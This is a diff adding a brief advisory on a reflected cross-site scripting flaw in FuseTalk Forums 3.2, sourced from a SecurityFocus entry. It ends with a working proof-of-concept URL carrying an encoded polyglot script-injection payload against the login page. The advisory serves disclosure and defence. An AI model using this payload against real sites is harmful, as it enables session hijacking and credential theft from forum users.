@@ -1,0 +1,9 @@
+source: http://www.securityfocus.com/bid/51227/info
+
+FuseTalk Forums is prone to a cross-site scripting vulnerability because it fails to properly sanitize user-supplied input.
+
+An attacker could leverage this issue to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This could allow the attacker to steal cookie-based authentication credentials and launch other attacks.
+
+FuseTalk Forums 3.2 is vulnerable; other versions may also be affected. 
+
+http://www.example.com/login.cfm?windowed=%27;alert%28String.fromCharCode%2888,83,83%29%29//\%27;alert%28String.fromCharCode%2888,83,83%29%29//%22;alert%28String.fromCharCode%2888,83,83%29%29//\%22;alert%28String.fromCharCode%2888,83,83%29%29//--%3E%3C/SCRIPT%3E%22%3E%27%3E%3CSCRIPT%3Ealert%28String.fromCharCode%2888,83,83%29%29%3C/SCRIPT%3E 
